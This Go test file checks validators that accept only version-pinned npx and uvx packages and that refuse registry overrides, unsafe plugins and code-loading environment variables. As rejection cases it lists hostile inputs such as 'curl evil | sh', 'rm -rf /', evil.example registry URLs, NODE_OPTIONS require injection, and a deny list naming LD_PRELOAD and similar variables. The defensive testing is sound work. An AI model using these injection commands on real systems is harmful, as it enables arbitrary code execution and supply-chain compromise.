package tool

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Temikus/denkeeper/internal/config"
)

func TestValidatePinnedPackageArgs_NpxPinned(t *testing.T) {
	for _, args := range [][]string{
		{"-y", "@modelcontextprotocol/server-github@2025.4.8"},
		{"--yes", "mcp-server@1.2.3"},
		{"-y", "pkg@1.2.3-beta.1", "--some-flag", "value"},
		{"--package", "@scope/pkg@0.1.0", "pkg-bin", "arg"},
		{"--package=pkg@1.0.0", "bin"},
		{"--", "pkg@1.0.0", "--flag"},
	} {
		if err := ValidatePinnedPackageArgs("npx", args); err != nil {
			t.Errorf("npx %v: unexpected error %v", args, err)
		}
	}
}

func TestValidatePinnedPackageArgs_NpxUnpinned(t *testing.T) {
	for _, args := range [][]string{
		{"-y", "@modelcontextprotocol/server-github"},
		{"mcp-server"},
		{"mcp-server@latest"},
		{"mcp-server@^1.2.3"},
		{"mcp-server@1"},
		{"github:evil/repo"},
		{"https://example.com/pkg.tgz"},
		{"./local.js"},
		{"--package", "pkg", "bin"},
		{"-y"},
		{"-c", "curl evil | sh"},
		{"--call=rm -rf /"},
		{"-p", "pkg@1.0.0", "-c", "sh"},
	} {
		if err := ValidatePinnedPackageArgs("npx", args); err == nil {
			t.Errorf("npx %v: accepted, want rejection", args)
		}
	}
}

func TestValidatePinnedPackageArgs_LauncherPathAndExtension(t *testing.T) {
	for _, cmd := range []string{"/usr/local/bin/npx", `C:\nodejs\npx.cmd`, "NPX.EXE"} {
		if err := ValidatePinnedPackageArgs(cmd, []string{"pkg"}); err == nil {
			t.Errorf("%s pkg: accepted, want rejection", cmd)
		}
	}
}

func TestValidatePinnedPackageArgs_Uvx(t *testing.T) {
	ok := [][]string{
		{"mcp-server-fetch==2025.1.17"},
		{"mcp-server-fetch@2025.1.17"},
		{"--python", "3.12", "pkg[extra]==1.0"},
		{"--from", "pkg==1.0.0", "pkg-cli"},
		{"--from=pkg==1.0.0", "--with", "dep==2.0", "cli"},
	}
	for _, args := range ok {
		if err := ValidatePinnedPackageArgs("uvx", args); err != nil {
			t.Errorf("uvx %v: unexpected error %v", args, err)
		}
	}
	bad := [][]string{
		{"mcp-server-fetch"},
		{"pkg>=1.0"},
		{"pkg==1.*"},
		{"git+https://example.com/repo"},
		{"--from", "pkg", "cli"},
		{"--from", "pkg==1.0", "--with", "dep", "cli"},
		{"--with-requirements", "reqs.txt", "pkg==1.0"},
		{"--python", "3.12"},
		{"--", "pkg"},
	}
	for _, args := range bad {
		if err := ValidatePinnedPackageArgs("uvx", args); err == nil {
			t.Errorf("uvx %v: accepted, want rejection", args)
		}
	}
}

func TestValidatePinnedPackageArgs_NpxRegistryOverridesRefused(t *testing.T) {
	for _, args := range [][]string{
		{"--registry", "https://evil.example", "pkg@1.0.0"},
		{"--registry=https://evil.example", "pkg@1.0.0"},
		{"--userconfig", "/tmp/npmrc", "pkg@1.0.0"},
		{"--globalconfig=/tmp/npmrc", "pkg@1.0.0"},
		{"-y", "--node-options=--require=/tmp/x.js", "pkg@1.0.0"},
		{"--node-options", "--require=/tmp/x.js", "pkg@1.0.0"},
		{"--script-shell", "/tmp/sh", "pkg@1.0.0"},
	} {
		requireRefusedOption(t, "npx", args)
	}
}

func TestValidatePinnedPackageArgs_UvxIndexOverridesRefused(t *testing.T) {
	for _, args := range [][]string{
		{"--index-url", "https://evil.example/simple", "pkg==1.0"},
		{"--index-url=https://evil.example/simple", "pkg==1.0"},
		{"-i", "https://evil.example/simple", "pkg==1.0"},
		{"--default-index", "https://evil.example/simple", "pkg==1.0"},
		{"--extra-index-url=https://evil.example/simple", "pkg==1.0"},
		{"--index", "evil=https://evil.example/simple", "pkg==1.0"},
		{"--find-links", "/tmp/wheels", "pkg==1.0"},
		{"-f", "/tmp/wheels", "pkg==1.0"},
		{"--allow-insecure-host", "pypi.org", "pkg==1.0"},
		{"--env-file", ".env", "pkg==1.0"},
	} {
		requireRefusedOption(t, "uvx", args)
	}
}

// These name a file or URL that can replace the pinned version or load a
// config that moves the index.
func TestValidatePinnedPackageArgs_UvxFileAndProjectFlagsRefused(t *testing.T) {
	for _, flag := range []string{"--overrides", "--constraints", "-c", "--build-constraints", "-b",
		"--config-file", "--directory", "--project", "--cache-dir"} {
		requireRefusedOption(t, "uvx", []string{flag, "/tmp/x", "pkg==1.0"})
	}
}

// --python with a path runs that executable as the interpreter.
func TestValidatePinnedPackageArgs_UvxPythonOnlyBareVersion(t *testing.T) {
	for _, args := range [][]string{
		{"--python", "3.12", "pkg==1.0"},
		{"-p", "3", "pkg==1.0"},
		{"--python=3.12.4", "pkg==1.0"},
	} {
		if err := ValidatePinnedPackageArgs("uvx", args); err != nil {
			t.Errorf("uvx %v: unexpected error %v", args, err)
		}
	}
	for _, args := range [][]string{
		{"--python", "/tmp/evil", "pkg==1.0"},
		{"-p=./python", "pkg==1.0"},
		{"--python", "pypy@3.10", "pkg==1.0"},
		{"--python"},
	} {
		if err := ValidatePinnedPackageArgs("uvx", args); err == nil {
			t.Errorf("uvx %v: accepted, want rejection", args)
		}
	}
}

// Every entry in a launcher's refused set must hit the refused branch, in
// both the separate-value and --flag=value forms, so a typo or a move into
// valueFlags/boolFlags fails here. The "cannot be pinned" message tells the
// refused branch apart from the unknown-option fallback, which also rejects.
func TestValidatePinnedPackageArgs_EveryRefusedFlagRefused(t *testing.T) {
	for _, tc := range []struct {
		l   launcher
		pkg string
	}{{npxLauncher, "pkg@1.0.0"}, {uvxLauncher, "pkg==1.0"}} {
		for flag := range tc.l.refused {
			requireRefusedOption(t, tc.l.name, []string{flag, "x", tc.pkg})
			requireRefusedOption(t, tc.l.name, []string{flag + "=x", tc.pkg})
		}
	}
}

func requireRefusedOption(t *testing.T, command string, args []string) {
	t.Helper()
	err := ValidatePinnedPackageArgs(command, args)
	if err == nil {
		t.Errorf("%s %v: accepted, want rejection", command, args)
		return
	}
	if !strings.Contains(err.Error(), "cannot be pinned") {
		t.Errorf("%s %v: rejected as %q, want the refused-option error", command, args, err)
	}
}

// An unknown option might take a value; reading it as boolean would check
// the value as the package while the launcher runs the next argument.
func TestValidatePinnedPackageArgs_UnknownOptionRefused(t *testing.T) {
	if err := ValidatePinnedPackageArgs("uvx", []string{"--made-up-option", "pkg==1.0", "evil"}); err == nil {
		t.Error("uvx with an unknown option before a pinned-looking value: accepted, want rejection")
	}
	if err := ValidatePinnedPackageArgs("npx", []string{"--made-up-option", "pkg@1.0.0", "evil"}); err == nil {
		t.Error("npx with an unknown option before a pinned-looking value: accepted, want rejection")
	}
}

// --refresh-package takes a value, so the package that runs is "evil", which
// is unpinned.
func TestValidatePinnedPackageArgs_UvxKnownValueFlagSkipsItsValue(t *testing.T) {
	if err := ValidatePinnedPackageArgs("uvx", []string{"--refresh-package", "pkg==1.0", "evil"}); err == nil {
		t.Error("uvx --refresh-package pkg==1.0 evil: accepted, want rejection")
	}
	if err := ValidatePinnedPackageArgs("uvx", []string{"--refresh-package", "dep", "-q", "pkg==1.0"}); err != nil {
		t.Errorf("uvx --refresh-package dep -q pkg==1.0: unexpected error %v", err)
	}
}

func TestValidatePinnedPackageArgs_OtherCommandsUntouched(t *testing.T) {
	if err := ValidatePinnedPackageArgs("/usr/bin/my-mcp", []string{"anything"}); err != nil {
		t.Errorf("unexpected error %v", err)
	}
}

func TestValidateUntrustedPlugin(t *testing.T) {
	if err := ValidateUntrustedPlugin(config.PluginConfig{Type: "docker", Image: "x:1"}); err != nil {
		t.Errorf("plain docker plugin rejected: %v", err)
	}
	if err := ValidateUntrustedPlugin(config.PluginConfig{Type: "docker", Image: "x:1", Network: "bridge"}); err != nil {
		t.Errorf("bridge network rejected: %v", err)
	}
	for _, cfg := range []config.PluginConfig{
		{Type: "subprocess", Command: "/bin/sh"},
		{Type: "docker", Image: "x:1", Network: "host"},
		{Type: "docker", Image: "x:1", Network: " HOST "},
		{Type: "docker", Image: "x:1", Network: "container:abc"},
		{Type: "docker", Image: "x:1", Volumes: []string{"/:/host"}},
	} {
		if err := ValidateUntrustedPlugin(cfg); err == nil {
			t.Errorf("%+v accepted, want rejection", cfg)
		}
	}
}

func TestIsHumanOnlyToolName(t *testing.T) {
	for _, name := range []string{"tool_add", "plugin_add", "config-default__tool_add"} {
		if !IsHumanOnlyToolName(name) {
			t.Errorf("%s: not human-only", name)
		}
	}
	for _, name := range []string{"tool_remove", "tool_list", "my_tool_add_x", ""} {
		if IsHumanOnlyToolName(name) {
			t.Errorf("%s: human-only, want not", name)
		}
	}
}

func newAllowlistLifecycleMgr(t *testing.T, allowed ...string) *LifecycleManager {
	t.Helper()
	cfgPath := filepath.Join(t.TempDir(), "denkeeper.toml")
	if err := os.WriteFile(cfgPath, []byte("[telegram]\ntoken = \"test\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	mgr := NewManager(testLogger(), config.MCPConfig{AllowedCommands: allowed})
	return NewLifecycleManager(mgr, cfgPath, 5, testLogger())
}

func TestLifecycleAddTool_CommandNotAllowlisted(t *testing.T) {
	lm := newAllowlistLifecycleMgr(t, "npx")
	err := lm.AddTool(context.Background(), "evil", config.ToolConfig{Command: "/bin/sh", Args: []string{"-c", "id"}})
	if err == nil || !strings.Contains(err.Error(), "allowed_commands") {
		t.Fatalf("err = %v, want an allowed_commands rejection", err)
	}
	// Base-name matching would let any binary called npx through.
	err = lm.AddTool(context.Background(), "evil2", config.ToolConfig{Command: "/tmp/x/npx", Args: []string{"pkg@1.0.0"}})
	if err == nil || !strings.Contains(err.Error(), "allowed_commands") {
		t.Fatalf("err = %v, want /tmp/x/npx rejected for an npx entry", err)
	}
}

func TestLifecycleAddTool_UnpinnedPackageRejectedWithoutAllowlist(t *testing.T) {
	lm := newAllowlistLifecycleMgr(t)
	err := lm.AddTool(context.Background(), "gh", config.ToolConfig{Command: "npx", Args: []string{"-y", "@modelcontextprotocol/server-github"}})
	if err == nil || !strings.Contains(err.Error(), "pinned") {
		t.Fatalf("err = %v, want an unpinned-package rejection", err)
	}
}

func TestLifecycleAddTool_SSEIgnoresCommandAllowlist(t *testing.T) {
	m := NewManager(testLogger(), config.MCPConfig{AllowedCommands: []string{"npx"}})
	if err := m.checkRuntimeCommand(config.ToolConfig{Transport: "sse", URL: "https://example.com"}); err != nil {
		t.Errorf("sse tool rejected by the command allowlist: %v", err)
	}
}

func TestValidateRuntimeEnv_RefusesCodeLoadingNames(t *testing.T) {
	for _, name := range []string{
		"NODE_OPTIONS", "node_options", "NODE_PATH", "NODE_EXTRA_CA_CERTS",
		"npm_config_registry", "NPM_CONFIG_USERCONFIG", "npm_config_globalconfig",
		"UV_INDEX_URL", "UV_DEFAULT_INDEX", "UV_EXTRA_INDEX_URL", "UV_FIND_LINKS",
		"UV_INSECURE_HOST", "UV_CONFIG_FILE", "UV_OVERRIDE", "uv_python",
		"PIP_INDEX_URL", "pip_extra_index_url",
		"PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PYTHONUSERBASE",
		"LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "dyld_library_path",
		"BASH_ENV", "ENV", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS",
		"PERL5OPT", "PERL5LIB", "RUBYOPT", "RUBYLIB",
		"PATH", "HOME", "SSL_CERT_FILE", "SSL_CERT_DIR",
		"XDG_CONFIG_HOME", "XDG_CONFIG_DIRS", "XDG_CACHE_HOME", "xdg_data_home",
		"PREFIX", "USERPROFILE", "APPDATA", "LOCALAPPDATA",
	} {
		err := ValidateRuntimeEnv(map[string]string{"API_KEY": "x", name: "v"})
		if err == nil {
			t.Errorf("%s: accepted, want rejection", name)
			continue
		}
		if !strings.Contains(err.Error(), name) {
			t.Errorf("%s: error %q does not name the variable", name, err)
		}
	}
}

// These checks apply to admin callers too, so the refusal must point at the
// config file rather than read as a missing permission.
func TestRuntimeRefusals_PointAtTheConfigFile(t *testing.T) {
	for name, err := range map[string]error{
		"env":            ValidateRuntimeEnv(map[string]string{"NODE_OPTIONS": "x"}),
		"refused option": ValidatePinnedPackageArgs("npx", []string{"--registry", "x", "pkg@1.0.0"}),
		"unknown option": ValidatePinnedPackageArgs("uvx", []string{"--made-up", "pkg==1.0"}),
		"python":         ValidatePinnedPackageArgs("uvx", []string{"--python", "/tmp/py", "pkg==1.0"}),
	} {
		if err == nil {
			t.Errorf("%s: accepted, want rejection", name)
			continue
		}
		msg := err.Error()
		if strings.Contains(msg, "only an operator") || !strings.Contains(msg, "put this tool in the config file instead") {
			t.Errorf("%s: %q, want it to point at the config file", name, msg)
		}
	}
}

func TestValidateRuntimeEnv_AllowsOrdinaryNames(t *testing.T) {
	env := map[string]string{
		"GITHUB_TOKEN": "x", "PYTHONUNBUFFERED": "1", "NODE_ENV": "production",
		"LOG_LEVEL": "debug", "ENVIRONMENT": "prod", "UVICORN_PORT": "8000",
	}
	if err := ValidateRuntimeEnv(env); err != nil {
		t.Errorf("ordinary env refused: %v", err)
	}
}

// With the allowlist set, a non-admin REST key reaches only this check, so it
// is what stops NODE_OPTIONS running other code inside an allowed npx.
func TestLifecycleAddTool_CodeLoadingEnvRefused(t *testing.T) {
	lm := newAllowlistLifecycleMgr(t, "npx")
	err := lm.AddTool(context.Background(), "evil", config.ToolConfig{
		Command: "npx", Args: []string{"-y", "pkg@1.0.0"},
		Env: map[string]string{"NODE_OPTIONS": "--import=data:text/javascript,process.exit(7)"},
	})
	if err == nil || !strings.Contains(err.Error(), "NODE_OPTIONS") {
		t.Fatalf("err = %v, want a NODE_OPTIONS rejection", err)
	}
	if len(lm.ListTools()) != 0 {
		t.Error("tool registered despite the rejection")
	}
}

// An env-only edit leaves the command line alone but changes what the
// respawned child runs, so it is checked too.
func TestLifecycleUpdateTool_EnvOnlyChangeRechecked(t *testing.T) {
	lm := newAllowlistLifecycleMgr(t, "npx")
	off := false
	stored := config.ToolConfig{Command: "npx", Args: []string{"pkg@1.0.0"}, Env: map[string]string{"A": "1"}, Enabled: &off}
	lm.toolMgr.RegisterDisabled("gh", stored, "test", false)

	next := stored
	next.Env = map[string]string{"A": "1", "npm_config_registry": "https://evil.example"}
	err := lm.UpdateTool(context.Background(), "gh", next)
	if err == nil || !strings.Contains(err.Error(), "npm_config_registry") {
		t.Fatalf("err = %v, want an npm_config_registry rejection", err)
	}
	got, _ := lm.toolMgr.ServerToolConfig("gh")
	if _, ok := got.Env["npm_config_registry"]; ok {
		t.Error("refused env was stored")
	}

	next.Env = map[string]string{"A": "2"}
	if err := lm.UpdateTool(context.Background(), "gh", next); err != nil {
		t.Errorf("ordinary env change refused: %v", err)
	}
}

// An env-only edit checks the env alone, so an operator's TOML tool whose
// command is not on the allowlist keeps a harmless env edit.
func TestLifecycleUpdateTool_EnvOnlyChangeSkipsCommandCheck(t *testing.T) {
	lm := newAllowlistLifecycleMgr(t, "npx")
	off := false
	stored := config.ToolConfig{Command: "/opt/operator/mcp", Enabled: &off}
	lm.toolMgr.RegisterDisabled("op", stored, "test", false)

	next := stored
	next.Env = map[string]string{"LOG_LEVEL": "debug"}
	if err := lm.UpdateTool(context.Background(), "op", next); err != nil {
		t.Errorf("env-only edit of an operator tool refused: %v", err)
	}
}

func TestCommandLineChanged(t *testing.T) {
	base := config.ToolConfig{Command: "npx", Args: []string{"a"}}
	if CommandLineChanged(base, config.ToolConfig{Command: "npx", Args: []string{"a"}, RequestTimeoutSecs: 9}) {
		t.Error("timeout-only edit reported as a command change")
	}
	if CommandLineChanged(base, config.ToolConfig{Transport: "stdio", Command: "npx", Args: []string{"a"}}) {
		t.Error("explicit stdio vs empty transport reported as a change")
	}
	for _, next := range []config.ToolConfig{
		{Command: "uvx", Args: []string{"a"}},
		{Command: "npx", Args: []string{"b"}},
		{Transport: "sse", URL: "https://x"},
	} {
		if !CommandLineChanged(base, next) {
			t.Errorf("%+v not reported as a change", next)
		}
	}
}
